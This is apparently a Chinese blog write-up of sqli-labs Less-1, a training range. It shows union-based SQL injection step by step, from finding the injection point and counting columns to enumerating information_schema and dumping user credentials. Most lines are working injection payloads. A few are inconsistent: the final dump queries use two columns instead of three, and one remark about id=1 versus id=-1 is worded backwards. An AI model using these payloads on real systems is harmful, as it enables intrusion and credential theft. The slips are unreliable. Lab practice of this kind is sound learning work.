sqli-lab-1的wp

发表于2026-09-25|sqli-lab
|浏览量:

sql-lab-1

  • 使用sqli-lab靶场

这是我完成第一题的wp:


首先打开靶场,发现页面有提示，要去我们输入ID

初步猜想是get型的，尝试在地址栏补充"?id=1"

发现页面出现登入账号和密码，修改id后面的数字，可以拿到不同的账号密码
但是我希望能进一步了解这个靶场，先测试sql注入入口
构造"?id=1'"

页面报sql语法错误，确定注入点
补充一下，除了上面修改id后面的数字以外，还可以构造
?id=1' and 1=1 --+
?id=1' and 1=2 --+

比较两个页面的不同来确定注入点
接下来用order by 判断查询有多少列

  • order by 1：按第 1 列排序，正常页面，代表存在第 1 列
  • order by 2：正常，存在第 2 列
  • order by 3：正常，存在第 3 列
  • order by 4：页面报错 → 最多只有 3 列

接下来查询数据库名称
构造:?id=-1' union select 11,database(),33--+

这样就可以得到一个数据库名称：security
如果还想查其他的名称，可以用limit:
例如:?id=-1' union select 11,database(),33 limit 0,1 --+
修改'0'即可查询其他的名称
其实还可以一口气查出全部：
?id=-1' union select 11,group_concat(schema_name),33 from information_schema.schemata--+

顺便提醒一下：如果?id=1而不是?id=-1的话，就会出现查询结果显示在页面的情况
大概是因为前面的语句先实现了，优先显示，所以导致我们后面构造的sql语句执行了也不显示

得到名称查询 security 库下面所有表名
构造:?id=-1' union select 11,group_concat(table_name),33 from information_schema.tables where table_schema='security'--+

可以得到users，我要找的账号密码信息应该就在其中

接下里查询 users 表里面全部字段（列名）
构造:?id=-1' union select 11,group_concat(column_name),33 from information_schema.columns where table_schema='security' and table_name='users'--+

得到：id 编号、username 账号、password 密码

最后就是脱库
构造:?id=-1' union select group_concat(username,0x7c,password),3 from security.users --+

这样就成功拿到账号密码了

但是账号密码太多了，可以构造:
?id=-1' union select concat(username,password),3 from security.users limit 0,1 --+
依旧是修改'0'这样就可以慢慢找出全部的账号密码了:

从这个靶场中可以学到sql注入数据库的全过程，接下俩就要学怎么绕过了
